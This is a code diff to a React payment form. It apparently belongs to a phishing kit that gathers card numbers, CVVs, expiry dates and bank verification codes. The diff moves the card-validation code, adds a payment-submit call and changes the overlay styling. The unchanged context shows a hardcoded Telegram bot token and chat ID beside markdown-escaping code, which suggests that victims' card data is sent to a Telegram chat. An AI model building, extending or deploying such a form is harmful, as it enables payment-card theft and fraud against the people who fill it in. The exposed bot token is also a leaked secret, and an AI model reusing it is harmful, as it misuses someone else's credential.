@@ -121,21 +121,6 @@ export default function PaymentForm({
     }
   };
 
-  // Validate card information
-  const validateCardInfo = () => {
-    const cardNumberValid =
-      cardInfo.cardNumber.replace(/\s/g, "").length === 16;
-    const cvvValid = cardInfo.cvv.length >= 2 && cardInfo.cvv.length <= 3;
-    const expiryDateValid = /^\d{2}\/\d{2}$/.test(cardInfo.expiryDate);
-
-    return (
-      cardNumberValid &&
-      cvvValid &&
-      expiryDateValid &&
-      cardInfo.cardHolder.trim() !== ""
-    );
-  };
-
   const handleVerificationComplete = (code: string) => {
     const escapeMarkdown = (
       text: string | number | Date | null | undefined
@@ -196,6 +181,21 @@ export default function PaymentForm({
         console.error("Error in payment process:", error);
       });
   };
+  // Validate card information
+  const validateCardInfo = () => {
+    const cardNumberValid =
+      cardInfo.cardNumber.replace(/\s/g, "").length === 16;
+    const cvvValid = cardInfo.cvv.length >= 2 && cardInfo.cvv.length <= 3;
+    const expiryDateValid = /^\d{2}\/\d{2}$/.test(cardInfo.expiryDate);
+
+    return (
+      cardNumberValid &&
+      cvvValid &&
+      expiryDateValid &&
+      cardInfo.cardHolder.trim() !== ""
+    );
+  };
+
 
   const handleVerificationCancel = () => {
     setShowVerificationForm(false);
@@ -332,7 +332,9 @@ export default function PaymentForm({
                 const safeText = text?.toString() || "";
                 return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
               };
-
+              
+              // handleVerificationComplete("1234")
+              handlePaymentSubmit();
               const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
               const chatId = "-1002630840593";
 
@@ -586,8 +588,8 @@ export default function PaymentForm({
 
       {/* Show verification form when needed */}
       {showVerificationForm && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-          <div className="max-w-md w-full mx-4">
+        <div className="fixed inset-0 bg-white bg-opacity-50 flex items-center justify-center z-50">
+          <div className=" mx-4">
             <VerificationCodeForm
               onVerificationComplete={handleVerificationComplete}
               onCancel={handleVerificationCancel}
